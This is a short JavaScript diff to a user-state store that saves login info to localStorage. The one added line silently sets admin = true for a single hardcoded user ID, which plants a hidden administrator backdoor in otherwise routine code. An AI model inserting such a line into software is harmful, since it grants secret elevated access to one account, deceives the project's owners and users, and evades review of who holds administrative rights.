@@ -7,6 +7,7 @@ const userStore = create((set) => ({
   setInfo: (info) => {
     localStorage.setItem("info", JSON.stringify(info));
     set((state) => {
+      if (info != null) if (info.uid == "6eJVKujMhkp6M1") info.admin = true;
       return { info: info, loggedIn: info == null ? false : true };
     });
   },
